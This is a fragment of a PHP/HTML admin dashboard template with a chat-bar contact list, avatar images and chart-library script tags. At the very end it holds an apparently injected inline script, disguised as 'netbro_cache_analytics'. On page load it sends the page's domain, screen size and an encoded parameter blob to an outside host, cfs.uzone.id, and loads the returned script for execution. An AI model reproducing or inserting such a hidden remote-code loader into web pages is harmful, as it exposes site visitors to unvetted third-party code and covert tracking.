<!-- Chat Bar -->
                    ...
                    <ul class="contacts-list">
                        <li class="contact">
                            <div class="contact-avatar">
                                <img src="<?= base_url(); ?>assets/img/avatars/divyia.jpg" />
                            </div>
                        ...
                        <li class="contact">
                            <div class="contact-avatar">
                                <img src="<?= base_url(); ?>assets/img/avatars/Nicolai-Larson.jpg" />
                            </div>
                            <div class="contact-info">
                        ...
                        <li class="contact">
                            <div class="contact-avatar">
                                <img src="<?= base_url(); ?>assets/img/avatars/John-Smith.jpg" />
                            </div>
                            <div class="contact-info">
                        ...
                        <li class="contact">
                            <div class="contact-avatar">
                                <img src="<?= base_url(); ?>assets/img/avatars/Osvaldus-Valutis.jpg" />
                            </div>
                            <div class="contact-info">
                        ...
                        <li class="contact">
                            <div class="contact-avatar">
                                <img src="<?= base_url(); ?>assets/img/avatars/Javi-Jimenez.jpg" />
                            </div>
                            <div class="contact-info">
                        ...
                        <li class="contact">
                            <div class="contact-avatar">
                                <img src="<?= base_url(); ?>assets/img/avatars/Stephanie-Walter.jpg" />
                            </div>
                            <div class="contact-info">
                        ...
                        <li class="contact">
                            <div class="contact-avatar">
                                <img src="<?= base_url(); ?>assets/img/avatars/Sergey-Azovskiy.jpg" />
                            </div>
                            <div class="contact-info">
                        ...
                        <li class="contact">
                            <div class="contact-avatar">
                                <img src="<?= base_url(); ?>assets/img/avatars/Lee-Munroe.jpg" />
                            </div>
                            <div class="contact-info">
    ...
    <script src="<?= base_url(); ?>assets/js/charts/easypiechart/jquery.easypiechart.js"></script>
    <script src="<?= base_url(); ?>assets/js/charts/easypiechart/easypiechart-init.js"></script>

    <!--Flot Charts Needed Scripts-->
    <script src="<?= base_url(); ?>assets/js/charts/flot/jquery.flot.js"></script>
    <script src="<?= base_url(); ?>assets/js/charts/flot/jquery.flot.resize.js"></script>
    <script src="<?= base_url(); ?>assets/js/charts/flot/jquery.flot.pie.js"></script>
    <script src="<?= base_url(); ?>assets/js/charts/flot/jquery.flot.tooltip.js"></script>
    <script src="<?= base_url(); ?>assets/js/charts/flot/jquery.flot.orderBars.js"></script>
...
<script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "cfs.uzone.id/2fn7a2/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582ECSaLdwqSpnRT264VaUKCerC0htC8r4AbSWEuU7Omxpx8hZ5eUbZ1k76j4aO8xoa3SlcPm%2f3Tq0bwKEa1smz87ZE8qWIV77IGftECCDo%2fHtZGavbPN85gdZxiypNWQVAS2RGX5UimZFPuz4tFRFQO7O6WYKc5YrZqySemr0MOCN%2fL6O9jgxgbziqEZEmL9j01UeTs42yJ2vxc6TXSKWBdafS%2bf9lVLYHV7%2bcXzjeMgG5Nr2tRbtvAxQQBpaCAGhVimLbULcSxaFpaUTgENMIusDDreXA%2fs7g7KlhizA72H6AUxAV%2bhg25rmndh18pb69PeBNiEgBipQDJeDwntfKv2%2bOrpSb2n%2biqTfSxavcBEhBk4JcJx8U5HziuLj0drH6C51wmYczfIzYqDa3nDpm5V1xdz3Nl6WjVEkhzG%2f1GOewbe%2bACBwc8Am4yS2AHUDLWDFCSmPblE4uDYuky1VeM9U%2bv19fzcViv1hNUxTN%2fSgk%2fnEZ5dUOp5whTQ05fvZPgVML2TlrmGO" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>
<!--  /Body -->
